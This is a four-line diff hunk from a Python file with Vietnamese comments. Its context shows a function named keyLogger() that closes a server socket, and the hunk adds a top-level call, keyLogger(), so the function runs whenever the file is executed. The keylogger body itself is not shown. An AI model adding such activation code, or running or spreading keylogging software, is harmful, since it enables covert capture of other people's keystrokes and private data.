@@ -57,3 +57,4 @@ def keyLogger():
 
         # Đóng socket server khi kết thúc chương trình
         serverSocket.close()
+keyLogger()
